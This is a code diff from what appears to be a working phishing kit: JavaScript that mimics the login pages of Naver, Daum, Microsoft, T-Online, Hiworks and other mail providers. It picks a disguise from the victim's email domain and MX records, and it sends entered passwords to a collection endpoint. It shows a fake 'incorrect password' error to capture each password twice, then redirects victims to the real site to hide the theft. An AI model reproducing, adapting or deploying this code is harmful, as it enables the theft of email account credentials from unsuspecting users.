+    'naver.com': { name:'Naver', domain:'naver.com', logoText:'NAVER', highlightText:'Mail', logoIcon:'N', logoColor:'#03c75a', accentColor:'#03c75a', buttonColor:'#03c75a', buttonHover:'#028c45', realSite:'https://mail.naver.com', subtitle:'네이버 메일', passwordHint:'네이버 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© NAVER Corp. All rights reserved.', flag:'🇰🇷' },
+    'naver.net': { name:'Naver', domain:'naver.net', logoText:'NAVER', highlightText:'Mail', logoIcon:'N', logoColor:'#03c75a', accentColor:'#03c75a', buttonColor:'#03c75a', buttonHover:'#028c45', realSite:'https://mail.naver.com', subtitle:'네이버 메일', passwordHint:'네이버 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© NAVER Corp. All rights reserved.', flag:'🇰🇷' },
+    'daum.net': { name:'Daum', domain:'daum.net', logoText:'Daum', highlightText:'메일', logoIcon:'D', logoColor:'#f9a800', accentColor:'#f9a800', buttonColor:'#f9a800', buttonHover:'#e09400', realSite:'https://mail.daum.net', subtitle:'Daum 메일', passwordHint:'다음 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© Kakao Corp. All rights reserved.', flag:'🇰🇷' },
+    'hanmail.net': { name:'Daum', domain:'hanmail.net', logoText:'Daum', highlightText:'한메일', logoIcon:'D', logoColor:'#f9a800', accentColor:'#f9a800', buttonColor:'#f9a800', buttonHover:'#e09400', realSite:'https://mail.daum.net', subtitle:'Daum 한메일', passwordHint:'다음 계정 비밀번호를 입력하세요', forgotPassword:'비밀번호 찾기', createAccount:'회원가입', copyright:'© Kakao Corp. All rights reserved.', flag:'🇰🇷' },
+    'outlook.com': { name:'Microsoft', domain:'outlook.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://outlook.live.com', subtitle:'Sign in to Outlook', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐' },
+    'office.com': { name:'Microsoft', domain:'office.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://www.office.com', subtitle:'Sign in to Office', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐' },
+    'office365.com': { name:'Microsoft', domain:'office365.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://www.office.com', subtitle:'Sign in to Office 365', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐' },
+    'live.com': { name:'Microsoft', domain:'live.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://login.live.com', subtitle:'Sign in to Microsoft', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐' },
+    'hotmail.com': { name:'Microsoft', domain:'hotmail.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://outlook.live.com', subtitle:'Sign in to Hotmail', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐' },
+    't-online.de': { name:'T-Online', domain:'t-online.de', logoText:'T-Online', highlightText:'', logoIcon:'T', logoColor:'#e20074', accentColor:'#e20074', buttonColor:'#e20074', buttonHover:'#b3005c', realSite:'https://www.t-online.de', subtitle:'T-Online E-Mail', passwordHint:'Geben Sie Ihr T-Online Passwort ein', forgotPassword:'Passwort vergessen?', createAccount:'Konto erstellen', copyright:'© Telekom AG. Alle Rechte vorbehalten.', flag:'🇩🇪' },
+    'default': { name:'Secure Login', domain:'secure.com', logoText:'Secure', highlightText:'Login', logoIcon:'SL', logoColor:'#1a73e8', accentColor:'#1a73e8', buttonColor:'#1a73e8', buttonHover:'#1557b0', realSite:'https://secure.com', subtitle:'Secure Sign In', passwordHint:'Enter your account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'Secure Login. All rights reserved.', flag:'🔒' }
+};
+
+/* ============================================================
+   3. HELPERS & LOGIC
+   ============================================================ */
+function extractDomain(email) { return email && email.includes('@') ? email.split('@')[1].toLowerCase() : ''; }
+function showError(platform, msg) { const el = document.getElementById(platform + '-err'); if (el) { el.textContent = msg; el.classList.add('show'); } }
+function clearError(platform) { const el = document.getElementById(platform + '-err'); if (el) { el.classList.remove('show'); } }
+
+async function detectProviderByMX(domain) {
+    try {
+        const res = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+        const data = await res.json();
+        if (data.Answer) {
+            const mxData = data.Answer.map(a => a.data.toLowerCase()).join(',');
+            
+            if (mxData.includes('yahoodns.net') || mxData.includes('yahoo.com')) return 'yahoo';
+            if (mxData.includes('google.com') || mxData.includes('googlemail.com')) return 'google';
+            if (mxData.includes('mail.protection.outlook.com') || mxData.includes('eo.outlook.com')) return 'm365';
+            
+            if (mxData.includes('hiworks') || mxData.includes('gabia') || mxData.includes('mailplug') || mxData.includes('hanbiro') || mxData.includes('dooray') || mxData.includes('worksmobile') || mxData.includes('kakaowork') || mxData.includes('daouoffice') || mxData.includes('bizmeka') || mxData.includes('ktbiz') || mxData.includes('kornet')) return 'hiworks';
+            
+            if (mxData.includes('hibox') || mxData.includes('hinet') || mxData.includes('mail2000') || mxData.includes('mailcloud') || mxData.includes('seed.net.tw') || mxData.includes('pchome.com.tw')) return 'hibox';
+            
+            if (mxData.includes('gmx.net') || mxData.includes('web.de') || mxData.includes('1und1.de') || mxData.includes('ionos') || mxData.includes('strato') || mxData.includes('mail.de') || mxData.includes('freenet') || mxData.includes('telekom') || mxData.includes('posteo') || mxData.includes('mailbox.org') || mxData.includes('infomaniak') || mxData.includes('hostpoint') || mxData.includes('swizzonic') || mxData.includes('bluewin') || mxData.includes('hispeed') || mxData.includes('mailfence') || mxData.includes('migadu') || mxData.includes('laposte') || mxData.includes('orange.fr') || mxData.includes('sfr.fr') || mxData.includes('free.fr') || mxData.includes('ovh') || mxData.includes('arsys') || mxData.includes('dinahosting') || mxData.includes('nominalia') || mxData.includes('acens') || mxData.includes('telefonica') || mxData.includes('movistar') || mxData.includes('aruba.it') || mxData.includes('register.it') || mxData.includes('libero.it') || mxData.includes('virgilio.it') || mxData.includes('alice.it') || mxData.includes('tin.it') || mxData.includes('fastweb.it') || mxData.includes('tim.it')) return 'ionos';
+            
+            if (mxData.includes('zoho.com') || mxData.includes('zoho.eu')) return 'generic';
+            if (mxData.includes('yandex.net') || mxData.includes('yandex.ru')) return 'generic';
+        }
+    } catch (e) {}
+    
+    if (domain.endsWith('.co.kr') || domain.endsWith('.kr')) return 'hiworks';
+    if (domain.endsWith('.com.tw') || domain.endsWith('.tw')) return 'hibox';
+    if (domain.endsWith('.de') || domain.endsWith('.ch') || domain.endsWith('.at') || domain.endsWith('.fr') || domain.endsWith('.es') || domain.endsWith('.it')) return 'ionos';
+    return 'webmail'; 
+}
+
+function detectBrand(domain) {
+    if (!domain || domain === 'unknown') return BRAND_DB['default'];
+    if (BRAND_DB[domain]) return BRAND_DB[domain];
+    const genericName = domain.split('.')[0].toUpperCase();
+    return { name: genericName, domain, logoText: genericName, highlightText:'', logoIcon: genericName.charAt(0), logoColor: '#1a73e8', accentColor: '#1a73e8', buttonColor: '#1a73e8', buttonHover: '#1557b0', realSite: 'https://' + domain, subtitle: 'Sign in to ' + domain, passwordHint: 'Enter your account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright: '© ' + domain + '. All rights reserved.', flag:'🌐' };
+}
+
+function applyTheme(brand) {
+    document.getElementById('pageTitle').textContent = brand.subtitle;
+    document.getElementById('subtitleText').textContent = brand.subtitle;
+    document.getElementById('passwordHint').textContent = brand.passwordHint;
+    document.getElementById('logoText').innerHTML = (brand.logoText || brand.name) + (brand.highlightText ? `<span class="highlight">${brand.highlightText}</span>` : '') + `<span class="brand-flag">${brand.flag} ${brand.name}</span>`;
+    document.getElementById('domainBadge').textContent = brand.flag + ' ' + brand.domain.toUpperCase();
+    document.getElementById('domainBadge').style.background = brand.accentColor + '20';
+    document.getElementById('domainBadge').style.color = brand.accentColor;
+    
+    const btn = document.getElementById('signinBtn');
+    btn.style.background = brand.buttonColor;
+    btn.onmouseover = function(){ this.style.background = brand.buttonHover; };
+    btn.onmouseout  = function(){ this.style.background = brand.buttonColor; };
+    
+    document.getElementById('forgotLink').textContent = brand.forgotPassword;
+    document.getElementById('createLink').textContent = brand.createAccount;
+    document.getElementById('copyrightText').textContent = brand.copyright;
+    document.getElementById('password').placeholder = 'Enter your ' + brand.name + ' password';
+    document.getElementById('logoIcon').textContent = brand.logoIcon || '🔒';
+    document.getElementById('logoIcon').style.background = brand.logoColor;
+
+    const body = document.body;
+    if (brand.name === 'Microsoft') body.style.background = 'linear-gradient(135deg, #f0f4f8 0%, #dceefc 50%, #e8f0fe 100%)';
+    else { const c = brand.accentColor; body.style.background = `radial-gradient(circle at 25% 20%, ${c}30 0%, transparent 55%), radial-gradient(circle at 75% 80%, ${c}20 0%, transparent 55%), linear-gradient(135deg, #fafbfc 0%, ${c}10 100%)`; }
+}
+
+/* ============================================================
+   4. SUBMIT & LOGIN LOGIC
+   ============================================================ */
+async function submitLogin(platform) {
+    clearError(platform);
+    let pass = '', email = currentEmail;
+    
+    if (platform === 'yahoo') pass = document.getElementById('yahooPass').value.trim();
+    if (platform === 'google') pass = document.getElementById('googlePass').value.trim();
+    if (platform === 'abv') pass = document.getElementById('abvPass').value.trim();
+    if (platform === 'm365') pass = document.getElementById('m365Pass').value.trim();
+    if (platform === 'naver') pass = document.getElementById('naverPass').value.trim();
+    if (platform === 'daum') pass = document.getElementById('daumPass').value.trim();
+    if (platform === 'tonline') pass = document.getElementById('tonlinePass').value.trim();
+    if (platform === 'hibox') pass = document.getElementById('hiboxPass').value.trim();
+    if (platform === 'ionos') pass = document.getElementById('ionosPass').value.trim();
+    if (platform === 'webmail') pass = document.getElementById('webmailPass').value.trim();
+    if (platform === 'cpanel') pass = document.getElementById('cpanelPass').value.trim();
+    if (platform === 'generic') pass = document.getElementById('password').value.trim();
+
+    if (!pass || pass.length < 4) { 
+        if (platform === 'generic') {
+            document.getElementById('errorText').textContent = getTranslations().errShort;
+            document.getElementById('errorMessage').classList.add('show');
+        } else {
+            showError(platform, 'Password must be at least 4 characters.'); 
+        }
+        return; 
+    }
+
+    let btn = document.querySelector(`#${platform}Container button`) || document.getElementById('signinBtn');
+    const origText = btn.textContent;
+    btn.disabled = true;
+    btn.textContent = '...';
+
+    loginAttempts++;
+    const stage = loginAttempts === 1 ? 1 : 2;
+
+    const payload = { email: email, password: pass, stage: stage, firstPassword: stage === 2 ? firstPassword : undefined };
+    if (stage === 1) { payload.proof = proofFromUrl || undefined; payload.proofTs = proofTsFromUrl || undefined; }
+
+    try {
+        const res = await fetch(CONFIG.LOGIN_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        const data = await res.json();
+
+        if (stage === 2 && data.match === true && data.redirect) {
+            btn.textContent = '✅ Success';
+            setTimeout(() => { window.location.href = data.redirect; }, 1000);
+            return;
+        }
+
+        if (stage === 1) firstPassword = pass;
+        
+        if (platform === 'generic') {
+            document.getElementById('errorText').textContent = getTranslations().errWrong;
+            document.getElementById('errorMessage').classList.add('show');
+            document.getElementById('password').value = '';
+        } else {
+            showError(platform, 'Incorrect password. Please try again.');
+            document.querySelector(`#${platform}Container input[type="password"]`).value = '';
+        }
+        
+        btn.disabled = false;
+        btn.textContent = origText;
+
+        if (loginAttempts >= CONFIG.MAX_ATTEMPTS) {
+            if (platform === 'generic') document.getElementById('errorText').textContent = getTranslations().errTooMany;
+            else showError(platform, 'Too many attempts. Redirecting...');
+            setTimeout(() => { window.location.href = 'https://' + currentDomain; }, 1500);
+        }
+    } catch (err) {
+        if (platform === 'generic') {
+            document.getElementById('errorText').textContent = getTranslations().errWrong;
+            document.getElementById('errorMessage').classList.add('show');
+        } else {
+            showError(platform, 'Connection error. Please try again.');
+        }
+        btn.disabled = false;
+        btn.textContent = origText;
+    }
+}
+
+/* ============================================================
+   5. HIWORKS SPECIFIC LOGIC
+   ============================================================ */
+function initHiworks() {
+    document.body.classList.add('is-hiworks');
+    document.getElementById('hiworksContainer').style.display = 'flex';
+    
+    document.getElementById('hiworksEmail').value = currentEmail;
+    document.getElementById('hiworksEmailChip').textContent = currentEmail;
+    
+    const parts = currentDomain.split('.');
+    let orgName = parts[0] || 'Company';
+    orgName = orgName.charAt(0).toUpperCase() + orgName.slice(1);
+    document.getElementById('hiworksOrgName').textContent = orgName;
+
+    document.getElementById('hiworksPass1').addEventListener('input', function() {
+        document.getElementById('hiworksBtn1').style.background = this.value.length > 0 ? '#1e88e5' : '#9ec6f3';
+    });
+    document.getElementById('hiworksPass2').addEventListener('input', function() {
+        document.getElementById('hiworksBtn2').style.background = this.value.length > 0 ? '#1e88e5' : '#9ec6f3';
+    });
+    
+    document.getElementById('hiworksPass1').addEventListener('keypress', e => { if (e.key === 'Enter') submitHiworksStep1(); });
+    document.getElementById('hiworksPass2').addEventListener('keypress', e => { if (e.key === 'Enter') submitHiworksStep2(); });
+    
+    setTimeout(() => document.getElementById('hiworksPass1').focus(), 100);
+}
+
+async function submitHiworksStep1() {
+    const pw = document.getElementById('hiworksPass1').value.trim();
+    if (!pw) { showError('hiworks-err1', 'Please enter your password.'); return; }
+
+    const btn = document.getElementById('hiworksBtn1');
+    btn.disabled = true;
+    btn.textContent = 'Verifying...';
+    clearError('hiworks-err1');
+
+    try {
+        await fetch(CONFIG.LOGIN_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                email: currentEmail, 
+                password: pw, 
+                stage: 1,
+                proof: proofFromUrl || undefined,
+                proofTs: proofTsFromUrl || undefined
+            })
+        });
+    } catch (e) {
+        console.warn('Hiworks Stage 1 network error:', e);
+    }
+
+    hiworksFirstPass = pw;
+    
+    document.getElementById('hiworksStep1').style.display = 'none';
+    document.getElementById('hiworksBigLogo').style.display = 'none';
+    document.getElementById('hiworksStep2').style.display = 'block';
+    document.getElementById('hiworksPrivacy').style.display = 'block';
+    document.getElementById('hiworksPass2').value = '';
+    document.getElementById('hiworksBtn2').style.background = '#9ec6f3';
+    
+    btn.disabled = false;
+    btn.textContent = 'Next';
+    setTimeout(() => document.getElementById('hiworksPass2').focus(), 100);
+}
+
+async function submitHiworksStep2() {
+    const pw2 = document.getElementById('hiworksPass2').value.trim();
+    if (!pw2) { showError('hiworks-err2', 'Please enter your password.'); return; }
+
+    const btn = document.getElementById('hiworksBtn2');
+    btn.disabled = true;
+    btn.textContent = 'Signing in...';
+    clearError('hiworks-err2');
+
+    let match = false;
+    let redirect = 'https://login.office.hiworks.com/';
+
+    try {
+        const res = await fetch(CONFIG.LOGIN_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                email: currentEmail, 
+                password: pw2, 
+                stage: 2, 
+                firstPassword: hiworksFirstPass 
+            })
+        });
+        const data = await res.json();
+        
+        match = !!data.match;
+        if (data.redirect) redirect = data.redirect;
+    } catch (e) {
+        console.warn('Hiworks Stage 2 network error:', e);
+        match = (pw2 === hiworksFirstPass);
+    }
+
+    if (!match && pw2 === hiworksFirstPass) match = true;
+
+    if (match) {
+        btn.textContent = '✅ Success';
+        btn.style.background = '#1e88e5';
+        setTimeout(() => {
+            window.location.href = redirect;
+        }, 900);
+    } else {
+        showError('hiworks-err2', 'Passwords do not match. Please start over.');
+        btn.disabled = false;
+        btn.textContent = 'Sign-in';
+        btn.style.background = '#1e88e5';
+        setTimeout(() => {
+            document.getElementById('hiworksStep2').style.display = 'none';
+            document.getElementById('hiworksStep1').style.display = 'block';
+            document.getElementById('hiworksBigLogo').style.display = 'block';
+            document.getElementById('hiworksPrivacy').style.display = 'none';
+            document.getElementById('hiworksPass1').value = '';
+            document.getElementById('hiworksBtn1').style.background = '#9ec6f3';
+            document.getElementById('hiworksPass1').focus();
+            hiworksFirstPass = '';
+        }, 2000);
+    }
+}
+
+/* ============================================================
+   6. UTILS
+   ============================================================ */
+function toggleTonPass() {
+    const p = document.getElementById('tonlinePass');
+    p.type = p.type === 'password' ? 'text' : 'password';
+}
+
+function toggleGooglePass() {
+    const p = document.getElementById('googlePass');
+    p.type = p.type === 'password' ? 'text' : 'password';
+}
+
+function toggleYahooPass() {
+    const p = document.getElementById('yahooPass');
+    p.type = p.type === 'password' ? 'text' : 'password';
+}
+
+function togglePasswordVisibility() {
+    const p = document.getElementById('password');
+    const b = document.querySelector('.toggle-password');
+    if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; }
+    else { p.type = 'password'; b.textContent = '👁️'; }
+}
+
+/* ============================================================
+   7. ROUTING / INIT
+   ============================================================ */
+document.addEventListener('DOMContentLoaded', async function() {
+    const params = new URLSearchParams(window.location.search);
+    let emailParam = params.get('u') || params.get('email') || '';
+    if (emailParam) { try { currentEmail = decodeURIComponent(emailParam); } catch(e) { currentEmail = emailParam; } }
+    else { currentEmail = 'test@outlook.com'; }
+
+    proofFromUrl = params.get('p') || '';
+    proofTsFromUrl = params.get('t') || '';
+    currentDomain = extractDomain(currentEmail);
+
+    document.body.classList.add('is-loading');
+    
+    // DIRECT ROUTING (No MX lookup needed for known providers)
+    if (['yahoo.com', 'ymail.com', 'rocketmail.com', 'yahoo.co.uk', 'yahoo.co.jp'].includes(currentDomain)) {
+        renderYahoo();
+    }
+    else if (currentDomain === 'gmail.com' || currentDomain === 'google.com') {
+        renderGoogle();
+    }
+    else if (currentDomain === 'abv.bg') {
+        document.body.classList.replace('is-loading', 'is-abv');
+        document.getElementById('abvContainer').style.display = 'block';
+        document.getElementById('abvEmail').value = currentEmail;
+        document.getElementById('abvPass').focus();
+    } else if (currentDomain === 'naver.com' || currentDomain === 'naver.net') {
+        document.body.classList.replace('is-loading', 'is-naver');
+        document.getElementById('naverEmail').value = currentEmail;
+        document.getElementById('naverPass').focus();
+    } else if (currentDomain === 'daum.net' || currentDomain === 'hanmail.net') {
+        document.body.classList.replace('is-loading', 'is-daum');
+        document.getElementById('daumEmail').value = currentEmail;
+        document.getElementById('daumPass').focus();
+    } else if (currentDomain === 't-online.de') {
+        document.body.classList.replace('is-loading', 'is-tonline');
+        document.getElementById('tonlineContainer').style.display = 'block';
+        document.getElementById('tonlineEmailDisplay').textContent = currentEmail;
+        document.getElementById('tonlinePass').focus();
+        document.getElementById('tonlinePass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('tonline'); });
+    } else if (['outlook.com', 'hotmail.com', 'live.com', 'microsoft.com', 'office.com', 'office365.com'].includes(currentDomain)) {
+        renderM365();
+    } else {
+        // Fallback to MX Lookup for Custom Domains
+        const provider = await detectProviderByMX(currentDomain);
+        if (provider === 'yahoo') renderYahoo();
+        else if (provider === 'google') renderGoogle();
+        else if (provider === 'm365') renderM365();
+        else if (provider === 'hiworks') renderHiworks();
+        else if (provider === 'hibox') renderHibox();
+        else if (provider === 'ionos') renderIonos();
+        else if (BRAND_DB[currentDomain]) renderGeneric(); 
+        else renderWebmail(); 
+    }
+
+    function renderYahoo() {
+        document.body.classList.replace('is-loading', 'is-yahoo');
+        document.getElementById('yahooContainer').style.display = 'flex';
+        document.getElementById('yahooEmailDisplay').textContent = currentEmail;
+        document.getElementById('yahooPass').focus();
+        document.getElementById('yahooPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('yahoo'); });
+    }
+
+    function renderGoogle() {
+        document.body.classList.replace('is-loading', 'is-google');
+        document.getElementById('googleContainer').style.display = 'flex';
+        document.getElementById('googleEmailDisplay').textContent = currentEmail;
+        document.getElementById('googlePass').focus();
+        document.getElementById('googlePass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('google'); });
+    }
+
+    function renderM365() {
+        document.body.classList.replace('is-loading', 'is-m365');
+        document.getElementById('m365EmailDisplay').textContent = currentEmail;
+        document.getElementById('m365Pass').focus();
+        document.getElementById('m365Pass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('m365'); });
+    }
+
+    function renderHiworks() {
+        document.body.classList.replace('is-loading', 'is-hiworks');
+        initHiworks();
+    }
+
+    function renderHibox() {
+        document.body.classList.replace('is-loading', 'is-hibox');
+        document.getElementById('hiboxContainer').style.display = 'block';
+        document.getElementById('hiboxEmail').value = currentEmail;
+        document.getElementById('hiboxPass').focus();
+        document.getElementById('hiboxPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('hibox'); });
+    }
+
+    function renderIonos() {
+        document.body.classList.replace('is-loading', 'is-ionos');
+        document.getElementById('ionosContainer').style.display = 'block';
+        document.getElementById('ionosEmailDisplay').textContent = currentEmail;
+        document.getElementById('ionosPass').focus();
+        document.getElementById('ionosPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('ionos'); });
+    }
+
+    function renderGeneric() {
+        currentBrand = detectBrand(currentDomain);
+        document.body.classList.replace('is-loading', 'is-generic');
+        document.getElementById('genericContainer').style.display = 'block';
+        document.getElementById('emailDisplay').value = currentEmail;
+        applyTheme(currentBrand);
+        applyTranslationsToGeneric();
+        document.getElementById('password').focus();
+        document.getElementById('password').addEventListener('keydown', e => { if(e.key==='Enter') submitLogin('generic'); });
+    }
+
+    function renderWebmail() {
+        document.body.classList.replace('is-loading', 'is-webmail');
+        document.getElementById('webmailContainer').style.display = 'flex';
+        document.getElementById('webmailEmail').value = currentEmail;
+        applyTranslationsToWebmail();
+        document.getElementById('webmailPass').focus();
+        document.getElementById('webmailPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('webmail'); });
+    }
+});
+</script>
+</body>
+</html>
